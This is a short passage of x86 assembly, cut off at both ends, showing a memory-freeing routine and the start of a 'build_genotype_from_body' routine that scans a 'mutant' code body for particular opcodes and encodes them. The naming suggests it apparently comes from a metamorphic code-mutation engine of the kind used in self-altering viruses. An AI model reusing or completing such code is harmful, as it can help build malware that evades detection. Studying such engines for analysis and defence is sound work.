       call [_VirtualFree]
       popad
       ret 4
free   endp

build_genotype_from_body PROC
       pushad

       mov eax, WORKSIZE
       call alloc
       push eax
       mov edi,eax

       mov esi,[userlist]
       mov ebp,[mutant_offset]
       sub ebx,ebx
  @@distance_loop:
       lodsd
       cmp eax,-1
       je @@distance_done

       cmp wo [ebp+eax],0f481h           ;XOR ESP
       jne @@distance_store

       mov ecx,eax
       mov eax,-2
       stosw
       mov eax,[ebp+ecx+2]
       mov [registers],eax
       bts eax, 15
       stosw

